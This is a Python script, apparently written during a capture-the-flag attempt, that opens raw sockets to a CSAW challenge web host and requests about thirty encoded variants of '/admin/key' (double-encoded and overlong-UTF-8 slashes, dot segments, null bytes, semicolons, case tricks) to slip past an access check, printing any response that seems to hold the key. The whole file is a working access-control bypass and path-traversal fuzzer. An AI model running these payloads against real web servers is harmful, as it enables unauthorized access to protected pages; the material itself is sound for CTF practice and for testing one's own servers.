import socket

HOST = 'web.chal.csaw.io'
PORT = 80

paths = [
    "/admin/key",
    "/admin%2fkey",
    "/admin%252fkey",
    "/admin%2Fkey",
    "/admin%252Fkey",
    "/admin/../admin/key",
    "/admin/%2e%2e/admin/key",
    "/admin%2f..%2fadmin%2fkey",
    "/./admin/key",
    "/admin/./key",
    "/admin//key",
    "/admin/key/",
    "/admin;/key",
    "/admin/key;",
    "/admin%00/key",
    "/admin/key%00",
    "/ADMIN/key",
    "/Admin/key",
    "/admin%09/key",
    "/admin%20/key",
    "/admin/key%20",
    "/admin/key.",
    "/admin/key..",
    "/admin/key%2e",
    "/admin%2e/key",
    "/admin/key%2f",
    "/admin%5ckey",
    "/admin/key%5c",
    "/admin%c0%afkey",
    "/admin%ef%bc%8fkey",
]

for p in paths:
    req = "GET %s HTTP/1.1\r\nHost: web.chal.csaw.io\r\nConnection: close\r\n\r\n" % p
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(8)
        s.connect((HOST, PORT))
        s.sendall(req.encode())
        data = b""
        while True:
            c = s.recv(4096)
            if not c:
                break
            data += c
        s.close()
        text = data.decode(errors='replace')
        status = text.split('\r\n')[0] if text else 'NO RESPONSE'
        has_key = 'key' in text.lower() and 'missing' not in text.lower()
        print("%-40s | %-30s | key=%s" % (p, status, has_key))
        if has_key:
            print("   >>>", text[:500])
    except Exception as e:
        print("%-40s | ERROR %s" % (p, e))
end_of_edit

